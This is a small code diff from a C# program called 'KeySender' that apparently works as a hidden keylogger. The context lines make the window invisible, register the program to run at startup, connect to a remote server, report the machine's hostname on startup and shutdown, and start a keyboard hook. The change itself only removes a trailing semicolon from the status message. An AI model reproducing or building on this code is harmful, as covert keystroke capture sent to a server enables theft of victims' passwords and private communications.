@@ -31,7 +31,7 @@ namespace KeySender
         {
             if (args.Reason == SessionEndReasons.SystemShutdown)
             {
-                var p = $"{Convert.ToInt32(PackageType.Off)};{System.Net.Dns.GetHostName()};";
+                var p = $"{Convert.ToInt32(PackageType.Off)};{System.Net.Dns.GetHostName()}";
                 SingletonWriter.Instance.Write(p);
             }
         }
@@ -44,7 +44,7 @@ namespace KeySender
             this.Opacity = 0D;
             SetAutorunValue(true);
             ConnectToServer();
-            var p = $"{Convert.ToInt32(PackageType.On)};{System.Net.Dns.GetHostName()};";
+            var p = $"{Convert.ToInt32(PackageType.On)};{System.Net.Dns.GetHostName()}";
             SingletonWriter.Instance.Write(p);
             KeyHook.InitializeComponent();
         }
